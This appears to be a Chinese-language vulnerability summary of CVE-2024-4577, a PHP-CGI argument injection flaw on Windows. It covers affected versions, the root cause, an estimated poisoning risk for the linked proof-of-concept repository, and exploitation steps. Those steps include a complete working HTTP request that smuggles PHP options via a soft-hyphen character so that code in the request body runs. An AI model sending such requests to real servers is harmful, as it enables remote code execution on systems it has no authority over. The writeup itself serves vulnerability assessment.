## CVE-2024-4577 - PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统, PHP 使用 CGI 模式运行, 启用使用“Best Fit”策略的代码页, Apache 服务器

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时会受到影响。漏洞源于 Windows 在某些代码页配置下，“Best Fit” 策略可能导致命令行参数中的字符被错误转换，PHP-CGI 模块会将这些字符误解为 PHP 选项，从而允许攻击者向 PHP 传递恶意参数。 

**有效性：**
提供的 POC 代码通过 POST 请求向服务器发送包含恶意 PHP 代码的请求体，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行请求体中的 PHP 代码。如果服务器返回“vulnerable”，则表示漏洞利用成功。从漏洞原理以及多个参考链接中漏洞利用的描述，可以判断该POC代码是有效的。

**投毒风险：**
提供的漏洞利用代码主要是用于验证漏洞是否存在，本身并没有发现明显的恶意代码或后门，但是从github仓库的拉取和环境配置过程中存在一定风险。投毒风险较低，估计为 5%。

**利用方式：**
1.  **环境准备：** 搭建存在漏洞的 PHP 环境，包括：
    *   Windows 系统
    *   PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8
    *   Apache 服务器
    *   PHP 以 CGI 模式运行
    *   配置系统 Locale 为日语、简体中文或繁体中文，以启用 Best-Fit 字符转换。
2.  **发送恶意请求：**  构造包含恶意 PHP 代码的 POST 请求，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行恶意代码。例如，使用以下请求：
```
POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{HOST}}
User-Agent: curl/8.3.0
Accept: /*
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo \"vulnerable\"; ?>
```

3.  **远程代码执行：** 成功利用漏洞后，攻击者可以在服务器上执行任意 PHP 代码，从而控制服务器。

**参考链接：**
*   [https://nvd.nist.gov/vuln/detail/cve-2024-4577](https://nvd.nist.gov/vuln/detail/cve-2024-4577)
*   [https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure](https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure)
*   [https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong](https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong)
*   [https://github.com/xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**项目地址:** [AlperenY-cs/CVE-2024-4577](https://github.com/AlperenY-cs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)